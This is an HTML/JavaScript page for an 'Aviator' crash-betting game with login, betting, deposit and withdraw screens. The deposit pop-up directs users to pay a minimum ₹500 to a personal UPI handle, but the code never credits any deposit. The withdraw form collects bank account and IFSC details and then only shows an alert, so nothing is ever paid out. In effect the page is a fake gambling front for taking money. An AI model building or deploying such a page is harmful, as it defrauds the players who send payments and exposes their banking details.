<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aviator Demo</title>

<style>

body{
    margin:0;
    font-family:Arial;
    background:#111;
    color:white;
    text-align:center;
}

.page{
    padding:20px;
}

input,button{
    padding:12px;
    margin:5px;
    border:none;
    border-radius:6px;
    font-size:16px;
}

button{
    background:#00d9ff;
    color:#000;
    font-weight:bold;
}

#gamePage{
    display:none;
}

#multi{
    font-size:60px;
    margin-top:30px;
    color:#00ff99;
}

#status{
    margin-top:20px;
    font-size:22px;
}

.popup{
    display:none;
    position:fixed;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    background:#222;
    padding:20px;
    border-radius:10px;
    width:300px;
}

.popup input{
    width:90%;
}

.top{
    background:#000;
    padding:15px;
}

.menuBtns{
    margin-top:20px;
}

</style>
</head>

<body>

<!-- LOGIN PAGE -->
<div id="loginPage" class="page">

<h2>Login</h2>

<input id="mobile" placeholder="Mobile Number"><br>

<input id="password" type="password" placeholder="Password"><br>

<button onclick="login()">LOGIN</button>

</div>

<!-- GAME PAGE -->
<div id="gamePage">

<div class="top">
<h3>Balance ₹<span id="balance">0</span></h3>
</div>

<div id="multi">1.00x</div>

<input id="betInput" placeholder="Bet Amount"><br>

<button onclick="placeBet()">BET</button>

<button onclick="cashout()">CASHOUT</button>

<h3 id="status"></h3>

<div class="menuBtns">

<button onclick="openDeposit()">Deposit</button>

<button onclick="openWithdraw()">Withdraw</button>

<button onclick="logout()">Logout</button>

</div>

</div>

<!-- DEPOSIT -->
<div id="depositBox" class="popup">

<h2>Deposit</h2>

<p>Minimum ₹500</p>

<p><b>UPI:</b> 7260957661@ybl</p>

<input id="depAmount" placeholder="Amount"><br>

<input id="utr" placeholder="UTR Number"><br>

<button onclick="submitDeposit()">Submit</button>

<button onclick="closeAll()">Close</button>

</div>

<!-- WITHDRAW -->
<div id="withdrawBox" class="popup">

<h2>Withdraw</h2>

<input id="wname" placeholder="Name"><br>

<input id="bank" placeholder="Bank Name"><br>

<input id="acc" placeholder="Account Number"><br>

<input id="ifsc" placeholder="IFSC"><br>

<input id="wamount" placeholder="Amount"><br>

<button onclick="submitWithdraw()">Submit</button>

<button onclick="closeAll()">Close</button>

</div>

<script>

/* USER DATA */

let currentUser = "";
let balance = 0;

let currentMultiplier = 1;
let crashed = false;
let userBet = 0;
let gameRunning = false;

/* AUTO LOGIN */

if(localStorage.getItem("user")){

currentUser = localStorage.getItem("user");

openGame();

}

/* LOGIN */

function login(){

let mobile =
document.getElementById("mobile").value;

let password =
document.getElementById("password").value;

if(!mobile || !password){

alert("Enter Details");

return;
}

currentUser = mobile;

/* SAVE LOGIN */

localStorage.setItem("user",mobile);

/* NEW USER BALANCE = 0 */

if(localStorage.getItem("balance_"+mobile) === null){

localStorage.setItem("balance_"+mobile,"0");

}

openGame();

}

/* OPEN GAME */

function openGame(){

document.getElementById("loginPage").style.display="none";

document.getElementById("gamePage").style.display="block";

let savedBalance =
localStorage.getItem("balance_"+currentUser);

balance = Number(savedBalance || 0);

updateBalance();

startGame();

}

/* SAVE BALANCE */

function updateBalance(){

document.getElementById("balance").innerText = balance;

localStorage.setItem(
"balance_"+currentUser,
balance
);

}

/* GAME LOOP */

function startGame(){

if(gameRunning) return;

gameRunning = true;

currentMultiplier = 1;

crashed = false;

document.getElementById("status").innerText = "";

let crashPoint = (Math.random()*4)+1.5;

let loop = setInterval(()=>{

currentMultiplier += 0.02;

document.getElementById("multi").innerText =
currentMultiplier.toFixed(2)+"x";

if(currentMultiplier >= crashPoint){

clearInterval(loop);

crashed = true;

document.getElementById("status").innerText =
"CRASHED 💥";

userBet = 0;

gameRunning = false;

setTimeout(startGame,2000);

}

},120);

}

/* BET */

function placeBet(){

let bet =
Number(document.getElementById("betInput").value);

if(bet<=0){

alert("Invalid Bet");

return;
}

if(bet>balance){

alert("Low Balance");

return;
}

if(userBet>0){

alert("Already Bet");

return;
}

if(crashed){

alert("Wait Next Round");

return;
}

balance -= bet;

updateBalance();

userBet = bet;

}

/* CASHOUT */

function cashout(){

if(userBet<=0){

alert("No Bet");

return;
}

if(crashed){

alert("Round Crashed");

userBet = 0;

return;
}

let win =
Math.floor(userBet * currentMultiplier);

balance += win;

updateBalance();

document.getElementById("status").innerText =
"You Won ₹"+win;

userBet = 0;

}

/* OPEN DEPOSIT */

function openDeposit(){

document.getElementById("depositBox").style.display="block";

}

/* OPEN WITHDRAW */

function openWithdraw(){

document.getElementById("withdrawBox").style.display="block";

}

/* CLOSE */

function closeAll(){

document.getElementById("depositBox").style.display="none";

document.getElementById("withdrawBox").style.display="none";

}

/* SUBMIT DEPOSIT */

function submitDeposit(){

let amount =
Number(document.getElementById("depAmount").value);

if(amount < 500){

alert("Minimum Deposit ₹500");

return;
}

alert(
"Deposit Request Sent\nUPI: 7260957661@ybl"
);

closeAll();

}

/* SUBMIT WITHDRAW */

function submitWithdraw(){

let amount =
Number(document.getElementById("wamount").value);

if(amount<=0){

alert("Invalid Amount");

return;
}

alert("Withdraw Request Sent");

closeAll();

}

/* LOGOUT */

function logout(){

localStorage.removeItem("user");

location.reload();

}

</script>

</body>
</html>
